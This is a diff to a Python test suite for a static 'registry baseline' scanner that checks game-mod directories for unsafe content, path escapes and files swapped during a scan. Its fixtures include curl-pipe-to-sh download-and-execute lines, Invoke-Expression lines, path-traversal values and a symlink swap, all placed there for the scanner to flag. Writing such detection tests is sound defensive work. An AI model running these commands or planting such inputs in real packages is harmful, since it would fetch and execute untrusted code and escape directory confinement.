@@ -1,7 +1,9 @@
 """``registry baseline``: a static, deterministic scan of a module or composition directory.
 
 Every fixture is a temporary tree built in the test; the two bundled examples must pass. Nothing
-here runs a backend or touches the network, and the route executes nothing in the tree.
+here runs a backend or touches the network, and the route executes nothing in the tree. The
+"tree changes under the scan" cases patch the listing (``baseline._lstat``) so the open-side
+checks run against a file that is not what the listing said.
 """
 import contextlib
 import io
@@ -44,6 +46,15 @@ def recipe(**over):
     return row
 
 
+def stat_with(st: os.stat_result, **over) -> os.stat_result:
+    """A copy of a stat result with some fields replaced (the listing's view of a changed file)."""
+    names = ["st_mode", "st_ino", "st_dev", "st_nlink", "st_uid", "st_gid", "st_size", "st_atime", "st_mtime", "st_ctime"]
+    fields = [getattr(st, n) for n in names]
+    for key, value in over.items():
+        fields[names.index(key)] = value
+    return os.stat_result(tuple(fields))
+
+
 class BaselineFixture(unittest.TestCase):
     def setUp(self):
         self.temp = tempfile.TemporaryDirectory()
@@ -81,6 +92,30 @@ class BaselineFixture(unittest.TestCase):
                 p.write_text(data)
         return directory
 
+    def pack(self, name, modules, **extra):
+        directory = self.root / name
+        directory.mkdir(parents=True, exist_ok=True)
+        data = {"schema": 1, "name": "stock_pack_test", "base": "stock", "map": "zm_transit", "modules": modules, **extra}
+        (directory / "composition.json").write_text(json.dumps(data, indent=2))
+        return directory
+
+    def listing_of(self, target: Path, replacement):
+        """The listing's view of ``target`` becomes ``replacement(real_stat)`` and its link check says
+        "not a link"; every other entry is real. This is the race the open-side checks exist for: the
+        directory listing saw a regular file, and what is on disk by the time it is opened differs."""
+        real_lstat, real_is_link = baseline._lstat, baseline._is_link
+
+        def fake_lstat(entry):
+            st = real_lstat(entry)
+            return replacement(st) if entry == target else st
+
+        def fake_is_link(entry):
+            return False if entry == target else real_is_link(entry)
+        stack = contextlib.ExitStack()
+        stack.enter_context(mock.patch.object(baseline, "_lstat", side_effect=fake_lstat))
+        stack.enter_context(mock.patch.object(baseline, "_is_link", side_effect=fake_is_link))
+        return stack
+
     def scan(self, directory, *extra):
         code, row = invoke(["registry", "baseline", str(directory), *extra, "--output", self.out()])
         return code, row
@@ -88,14 +123,19 @@ class BaselineFixture(unittest.TestCase):
     def ids(self, row, kind):
         return sorted(r["id"] for r in row["result"][kind])
 
+    def findings(self, row, rule):
+        return [r for r in row["result"]["findings"] if r["id"] == rule]
+
 
 class ExampleTests(BaselineFixture):
     def test_the_bundled_examples_pass(self):
-        for example in ("hello-zm", "hello-pack"):
-            code, row = self.scan(ROOT / "examples" / example)
+        # A module is scanned from its own directory; a pack from the directory that holds the
+        # pack and every member it names (here examples/, as a registry scans the repository).
+        for directory in (ROOT / "examples" / "hello-zm", ROOT / "examples"):
+            code, row = self.scan(directory)
             self.assertEqual(code, 0, row)
             result = row["result"]
-            self.assertEqual(result["outcome"], "passed", (example, result["findings"], result["capabilities"]))
+            self.assertEqual(result["outcome"], "passed", (directory.name, result["findings"], result["capabilities"]))
             self.assertFalse(result["blocked"])
             self.assertEqual(result["findings"], [])
             self.assertEqual(result["capabilities"], [])
@@ -116,9 +156,26 @@ class ExampleTests(BaselineFixture):
         code, row = self.scan(ROOT / "examples" / "hello-zm")
         self.assertEqual(row["result"]["declaration"]["id"], "hello_zm")
         self.assertEqual(row["result"]["declaration"]["payload"], "recipe")
+        code, row = self.scan(ROOT / "examples")
+        self.assertIsNone(row["result"]["declaration"], "no declaration at the root of examples/")
+        nested = {r["file"]: r for r in row["result"]["nested_declarations"]}
+        self.assertEqual(sorted(nested), ["hello-pack/composition.json", "hello-zm-two/module.json", "hello-zm/module.json"])
+        pack = nested["hello-pack/composition.json"]
+        self.assertEqual(pack["kind"], "composition")
+        self.assertEqual([(m["path"], m["exists"], m["declares"]) for m in pack["members"]],
+                         [("../hello-zm", True, "module.json"), ("../hello-zm-two", True, "module.json")])
+
+    def test_a_pack_scanned_from_its_own_directory_reports_its_siblings_as_outside(self):
+        # examples/hello-pack names ../hello-zm and ../hello-zm-two: from the pack's own directory
+        # they are outside the snapshot, which is a path-escape, and the evidence says where to scan from.
         code, row = self.scan(ROOT / "examples" / "hello-pack")
-        self.assertEqual(row["result"]["declaration"]["kind"], "composition")
-        self.assertEqual([m["declares"] for m in row["result"]["declaration"]["members"]], ["module.json", "module.json"])
+        self.assertEqual(code, 0, row)
+        self.assertEqual(row["result"]["outcome"], "needs-fixes")
+        rows = self.findings(row, "path-escape")
+        self.assertEqual([r["file"] for r in rows], ["composition.json", "composition.json"])
+        self.assertTrue(all("outside the scanned directory" in r["evidence"] and "holds every member" in r["evidence"] for r in rows), rows)
+        members = row["result"]["declaration"]["members"]
+        self.assertTrue(all(m["outside_scan_root"] and "exists" not in m for m in members), "nothing outside the tree is inspected")
 
 
 class BlockingFindingTests(BaselineFixture):
@@ -140,7 +197,7 @@ class BlockingFindingTests(BaselineFixture):
                                        "install.txt": "then the loader picks up plugins/hook.dll on launch\n"})
         code, row = self.scan(directory)
         self.assertEqual(row["result"]["outcome"], "needs-fixes")
-        rows = [(r["file"], r["line"]) for r in row["result"]["findings"] if r["id"] == "native-plugin"]
+        rows = [(r["file"], r["line"]) for r in self.findings(row, "native-plugin")]
         self.assertEqual(rows, [("README.md", 1), ("a.bin", None), ("b.bin", None), ("c.bin", None), ("install.txt", 1)])
 
     def test_curl_pipe_sh_is_download_and_execute_and_the_script_is_an_installer(self):
@@ -148,7 +205,7 @@ class BlockingFindingTests(BaselineFixture):
         code, row = self.scan(directory)
         self.assertEqual(code, 0, row)
         self.assertEqual(row["result"]["outcome"], "needs-fixes")
-        finding = [r for r in row["result"]["findings"] if r["id"] == "download-and-execute"]
+        finding = self.findings(row, "download-and-execute")
         self.assertEqual(len(finding), 1, row["result"]["findings"])
         self.assertEqual((finding[0]["file"], finding[0]["line"], finding[0]["blocking"]), ("tools/get.sh", 2, True))
         self.assertIn("curl https://x.invalid/setup.sh | sh", finding[0]["evidence"])
@@ -164,9 +221,9 @@ class BlockingFindingTests(BaselineFixture):
         })
         code, row = self.scan(directory)
         self.assertEqual(row["result"]["outcome"], "needs-fixes")
-        rows = [(r["file"], r["line"]) for r in row["result"]["findings"] if r["id"] == "download-and-execute"]
+        rows = [(r["file"], r["line"]) for r in self.findings(row, "download-and-execute")]
         self.assertEqual(rows, [("setup.ps1", 1), ("setup.ps1", 2), ("tools/amp.cmd", 2), ("tools/fetch.ps1", 3), ("tools/fetch.sh", 3)])
-        started = [r for r in row["result"]["findings"] if r["file"] == "tools/fetch.ps1" and r["id"] == "download-and-execute"][0]
+        started = [r for r in self.findings(row, "download-and-execute") if r["file"] == "tools/fetch.ps1"][0]
         self.assertIn("downloaded on line 1", started["evidence"])
         # The .exe URL without a hash is also an unpinned acquisition; the harmless download is neither.
         self.assertIn(("unpinned-acquisition", "tools/fetch.ps1", 1), [(r["id"], r["file"], r["line"]) for r in row["result"]["findings"]])
@@ -184,8 +241,7 @@ class BlockingFindingTests(BaselineFixture):
         code, row = self.scan(directory)
         self.assertEqual(code, 0, row)
         self.assertEqual(row["result"]["outcome"], "needs-fixes")
-        finding = [r for r in row["result"]["findings"] if r["id"] == "path-escape"]
-        self.assertEqual([(r["file"], r["line"]) for r in finding], [("linked.txt", None)])
+        self.assertEqual([(r["file"], r["line"]) for r in self.findings(row, "path-escape")], [("linked.txt", None)])
         self.assertEqual(row["result"]["skipped"], [{"path": "linked.txt", "reason": "link; not followed"}])
         self.assertEqual(row["result"]["scanned"]["files"], 3, "the link is neither scanned nor counted")
 
@@ -193,33 +249,59 @@ class BlockingFindingTests(BaselineFixture):
         directory = self.module(rec={"scripts": [{"source": "../evil.gsc", "target": "scripts/zm/evil.gsc", "instance": "server"}]})
         code, row = self.scan(directory)
         self.assertEqual(row["result"]["outcome"], "needs-fixes")
-        finding = [r for r in row["result"]["findings"] if r["id"] == "path-escape"]
+        finding = self.findings(row, "path-escape")
         self.assertEqual(len(finding), 1, row["result"]["findings"])
         self.assertEqual(finding[0]["file"], "project.json")
         self.assertIsInstance(finding[0]["line"], int)
         self.assertIn("../evil.gsc", finding[0]["evidence"])
 
-    def test_absolute_paths_in_declarations_are_path_escapes_but_a_composition_may_name_siblings(self):
-        directory = self.module(decl={"recipe": "/etc/project.json"})
+    def test_absolute_paths_and_windows_drives_in_declarations_are_path_escapes(self):
+        for value, word in (("/etc/project.json", "absolute"), ("C:outside/project.json", "drive"), ("D:\\mods\\project.json", "drive"),
+                            ("\\\\server\\share\\project.json", "absolute")):
+            directory = self.module(f"m-{word}-{len(value)}", decl={"recipe": value})
+            code, row = self.scan(directory)
+            self.assertEqual(row["result"]["outcome"], "needs-fixes", value)
+            finding = self.findings(row, "path-escape")
+            self.assertEqual([r["file"] for r in finding], ["module.json"], value)
+            self.assertIn("absolute path or Windows drive", finding[0]["evidence"], value)
+        # A drive-relative recipe source too: the recipe is confined to its directory on every OS.
+        directory = self.module("rec", rec={"scripts": [{"source": "C:scripts/x.gsc", "target": "scripts/zm/x.gsc", "instance": "server"}]})
         code, row = self.scan(directory)
-        finding = [r for r in row["result"]["findings"] if r["id"] == "path-escape"]
-        self.assertEqual([r["file"] for r in finding], ["module.json"])
-        pack = self.root / "pack"
-        pack.mkdir()
-        (pack / "composition.json").write_text(json.dumps({"schema": 1, "name": "stock_pack_test", "base": "stock", "map": "zm_transit",
-                                                            "modules": ["../module", {"path": "../missing", "role": "base"}, "/abs/dir"]}))
-        code, row = self.scan(pack)
+        self.assertEqual([r["file"] for r in self.findings(row, "path-escape")], ["project.json"])
+
+    def test_a_composition_names_siblings_inside_the_scanned_directory_only(self):
+        # The pack and its member live under tree/; the scan root is tree/, so ../module is a
+        # sibling inside the snapshot, ../missing is a missing sibling, /abs/dir is absolute, and
+        # ../../outside-module and a load two levels up resolve outside the scanned directory.
+        self.module("tree/module")
+        (self.root / "outside-module").mkdir()
+        (self.root / "outside-module" / "module.json").write_text(json.dumps(declaration()))
+        pack = self.pack("tree/pack", ["../module", {"path": "../missing", "role": "base"}, "/abs/dir", "../../outside-module"],
+                         loads=["../../base/common_zm.ff"])
+        code, row = self.scan(self.root / "tree")
+        self.assertEqual(code, 0, row)
         self.assertEqual(row["result"]["outcome"], "needs-fixes")
-        by_id = {}
-        for r in row["result"]["findings"]:
-            by_id.setdefault(r["id"], []).append(r["evidence"])
-        self.assertEqual(len(by_id["path-escape"]), 1, by_id)
-        self.assertIn("/abs/dir", by_id["path-escape"][0])
-        self.assertEqual(len(by_id["declaration-mismatch"]), 1, by_id)
-        self.assertIn("../missing", by_id["declaration-mismatch"][0])
-        members = row["result"]["declaration"]["members"]
-        self.assertEqual(members[0], {"path": "../module", "exists": True, "outside_directory": True, "declares": "module.json"})
+        escapes = self.findings(row, "path-escape")
+        self.assertEqual(len(escapes), 3, escapes)
+        self.assertTrue(all(r["file"] == "pack/composition.json" for r in escapes))
+        self.assertIn("/abs/dir", escapes[0]["evidence"])
+        self.assertIn("../../outside-module", escapes[1]["evidence"])
+        self.assertIn("outside the scanned directory", escapes[1]["evidence"])
+        self.assertIn("../../base/common_zm.ff", escapes[2]["evidence"])
+        mismatch = self.findings(row, "declaration-mismatch")
+        self.assertEqual(len(mismatch), 1, mismatch)
+        self.assertIn("../missing", mismatch[0]["evidence"])
+        nested = {r["file"]: r for r in row["result"]["nested_declarations"]}
+        self.assertEqual(sorted(nested), ["module/module.json", "pack/composition.json"])
+        members = nested["pack/composition.json"]["members"]
+        self.assertEqual(members[0], {"path": "../module", "outside_scan_root": False, "exists": True, "declares": "module.json"})
         self.assertEqual(members[1]["exists"], False)
+        self.assertEqual(members[3], {"path": "../../outside-module", "outside_scan_root": True})
+        self.assertEqual(row["result"]["scanned"]["files"], 4, "module.json, project.json, the script and the pack; nothing outside the tree")
+        # The same pack scanned from its own directory: even the good sibling is outside.
+        code, row = self.scan(pack)
+        evidence = [r["evidence"] for r in self.findings(row, "path-escape")]
+        self.assertTrue(any("'../module'" in e and "outside the scanned directory" in e for e in evidence), evidence)
 
 
 class ReviewFindingTests(BaselineFixture):
@@ -253,7 +335,7 @@ class ReviewFindingTests(BaselineFixture):
         self.assertEqual(row["result"]["expected"], {"repository": REPOSITORY, "commit": COMMIT})
         code, row = self.scan(directory, "--repository", "https://github.com/other/mods", "--commit", OTHER)
         self.assertEqual(row["result"]["outcome"], "review-required")
-        rows = [r for r in row["result"]["findings"] if r["id"] == "declaration-mismatch"]
+        rows = self.findings(row, "declaration-mismatch")
         self.assertEqual(len(rows), 2, rows)
         self.assertTrue(all(r["file"] == "module.json" and not r["blocking"] for r in rows))
         self.assertIn("source.repository", rows[0]["evidence"])
@@ -266,21 +348,43 @@ class ReviewFindingTests(BaselineFixture):
         code, row = self.scan(directory, "--repository", "http://github.com/someone/mods")
         self.assertEqual(row["error_code"], "input_invalid")
 
+    def test_source_fields_of_the_wrong_type_or_form_are_mismatches(self):
+        # A number where a string belongs used to slip past the comparison; every present field is
+        # checked for its documented form first, with or without the listing options.
+        typed = self.module("typed", decl={"source": {"repository": 123, "commit": 456}})
+        for extra in ((), ("--repository", REPOSITORY, "--commit", COMMIT)):
+            code, row = self.scan(typed, *extra)
+            self.assertEqual(code, 0, row)
+            self.assertEqual(row["result"]["outcome"], "review-required", extra)
+            rows = self.findings(row, "declaration-mismatch")
+            self.assertEqual(sorted(r["evidence"][:26] for r in rows), ["source.commit is not a 40-", "source.repository is not a"], rows)
+        forms = self.module("forms", decl={"source": {"repository": "http://github.com/x/y", "commit": "abc"}})
+        code, row = self.scan(forms, "--repository", REPOSITORY, "--commit", COMMIT)
+        self.assertEqual(len(self.findings(row, "declaration-mismatch")), 2)
+        listy = self.module("listy", decl={"source": ["https://github.com/x/y"]})
+        code, row = self.scan(listy)
+        rows = self.findings(row, "declaration-mismatch")
+        self.assertEqual(len(rows), 1, rows)
+        self.assertIn("source is not an object", rows[0]["evidence"])
+        upper = self.module("upper", decl={"source": {"repository": REPOSITORY, "commit": COMMIT.upper()}})
+        code, row = self.scan(upper, "--commit", COMMIT)
+        self.assertEqual([r["evidence"][:14] for r in self.findings(row, "declaration-mismatch")], ["source.commit "])
+
     def test_declaration_on_disk_checks(self):
         missing = self.module("missing", decl={"recipe": "recipes/project.json"})
         code, row = self.scan(missing)
-        rows = [r for r in row["result"]["findings"] if r["id"] == "declaration-mismatch"]
+        rows = self.findings(row, "declaration-mismatch")
         self.assertEqual(len(rows), 1, rows)
         self.assertIn("missing on disk", rows[0]["evidence"])
         empty = self.module("empty", decl={"bases": [], "maps": "zm_transit"})
         code, row = self.scan(empty)
-        rows = [r["evidence"] for r in row["result"]["findings"] if r["id"] == "declaration-mismatch"]
+        rows = [r["evidence"] for r in self.findings(row, "declaration-mismatch")]
         self.assertEqual(len(rows), 2, rows)
         self.assertTrue(any("bases" in e for e in rows) and any("maps" in e for e in rows))
         broken = self.module("broken")
         (broken / "module.json").write_text('{"schema": 1, "id": "x",\n  "version": ')
         code, row = self.scan(broken)
-        rows = [r for r in row["result"]["findings"] if r["id"] == "declaration-mismatch"]
+        rows = self.findings(row, "declaration-mismatch")
         self.assertEqual(len(rows), 1, rows)
         self.assertIn("not valid JSON", rows[0]["evidence"])
         self.assertEqual(row["result"]["declaration"], {"file": "module.json", "kind": "module", "valid": False})
@@ -288,7 +392,7 @@ class ReviewFindingTests(BaselineFixture):
         binary = self.module("binary")
         (binary / "module.json").write_bytes(b"\x00\x01\x02")
         code, row = self.scan(binary)
-        rows = [r["evidence"] for r in row["result"]["findings"] if r["id"] == "declaration-mismatch"]
+        rows = [r["evidence"] for r in self.findings(row, "declaration-mismatch")]
         self.assertEqual(rows, ["declaration is not a text file"])
         self.assertEqual(row["result"]["declaration"], {"file": "module.json", "kind": "module", "valid": False})
 
@@ -346,10 +450,8 @@ class CapabilityTests(BaselineFixture):
         rows = row["result"]["capabilities"]
         self.assertEqual([(r["id"], r["file"]) for r in rows], [("global-tooling", "project.json")])
         self.assertIn("raw/scripts/zm/announcer.gsc", rows[0]["evidence"])
-        pack = self.root / "pack"
+        pack = self.pack("pack", ["raw/scripts"])
         (pack / "raw" / "scripts").mkdir(parents=True)
-        (pack / "composition.json").write_text(json.dumps({"schema": 1, "name": "stock_global_test", "base": "stock", "map": "zm_transit",
-                                                            "modules": ["raw/scripts"]}))
         code, row = self.scan(pack)
         self.assertEqual(self.ids(row, "capabilities"), ["global-tooling"])
 
@@ -405,6 +507,49 @@ class IncompleteAndBoundsTests(BaselineFixture):
         self.assertEqual(row["result"]["outcome"], "incomplete")
         self.assertEqual([r["path"] for r in row["result"]["unreadable"]], ["private"])
 
+    def test_a_file_replaced_between_listing_and_reading_is_unreadable(self):
+        if os.name == "nt":
+            self.skipTest("the inode check and FIFOs are POSIX")
+        # Same path, another inode: the listing saw one file and the open found another.
+        directory = self.module(files={"swap.txt": "x\n"})
+        with self.listing_of(directory / "swap.txt", lambda st: stat_with(st, st_ino=st.st_ino + 1)):
+            code, row = self.scan(directory)
+        self.assertEqual(code, 0, row)
+        self.assertEqual(row["result"]["outcome"], "incomplete")
+        self.assertEqual(row["result"]["unreadable"], [{"path": "swap.txt", "reason": "replaced between listing and reading"}])
+        self.assertEqual(row["result"]["scanned"]["files"], 3, "the replaced entry is not counted or hashed")
+        # A regular file swapped for a link to an outside file: the no-follow open refuses it.
+        outside = self.root / "outside.txt"
+        outside.write_text("curl https://x.invalid/a | sh\n")
+        listed = (directory / "swap.txt").lstat()
+        (directory / "swap.txt").unlink()
+        os.symlink(outside, directory / "swap.txt")
+        with self.listing_of(directory / "swap.txt", lambda st: listed):
+            code, row = self.scan(directory)
+        self.assertEqual(row["result"]["outcome"], "incomplete")
+        self.assertEqual([r["path"] for r in row["result"]["unreadable"]], ["swap.txt"])
+        self.assertIn("symbolic link", row["result"]["unreadable"][0]["reason"].lower(), "refused by the no-follow open")
+        self.assertEqual(row["result"]["findings"], [], "the outside file was never read")
+        # A regular file swapped for a FIFO with no writer: the non-blocking open does not hang and
+        # the descriptor is refused because it is not a regular file.
+        (directory / "swap.txt").unlink()
+        os.mkfifo(directory / "swap.txt")
+        with self.listing_of(directory / "swap.txt", lambda st: listed):
+            code, row = self.scan(directory)
+        self.assertEqual(row["result"]["outcome"], "incomplete")
+        self.assertEqual(row["result"]["unreadable"], [{"path": "swap.txt", "reason": "not a regular file when opened"}])
+
+    def test_a_file_that_grows_after_the_listing_cannot_exceed_the_byte_bound(self):
+        # The listing said 10 bytes; the file is larger by the time it is read. The bound applies
+        # to the bytes actually read, so the scan is an input_limit refusal, not a report.
+        directory = self.module(files={"grow.bin": b"\x00" * 5000})
+        with mock.patch.object(baseline, "MAX_BYTES", 4096), self.listing_of(directory / "grow.bin", lambda st: stat_with(st, st_size=10)):
+            code, row = self.scan(directory)
+        self.assertEqual(code, 1, row)
+        self.assertEqual(row["error_code"], "input_limit")
+        self.assertIn("grew", row["hint"])
+        self.assertFalse((Path(row["receipt"]).parent / "baseline.json").exists(), "nothing was judged")
+
     def test_same_tree_scanned_twice_yields_identical_reports(self):
         directory = self.module(files={"README.md": "https://example.invalid/x.zip\n", "scripts/io.gsc": "fs_fopen();\n",
                                        "ui/a.txt": "x\n", "b.bin": b"\x00\x01"})
@@ -439,7 +584,7 @@ class IncompleteAndBoundsTests(BaselineFixture):
         text = "".join(f"Invoke-Expression $x{i}\n" for i in range(25))
         directory = self.module(files={"tools/many.ps1": text})
         code, row = self.scan(directory)
-        rows = [r for r in row["result"]["findings"] if r["id"] == "download-and-execute"]
+        rows = self.findings(row, "download-and-execute")
         self.assertEqual(len(rows), baseline.ROWS_PER_FILE_AND_RULE)
         self.assertEqual(row["result"]["truncated"], [{"file": "tools/many.ps1", "id": "download-and-execute", "omitted": 5}])
 
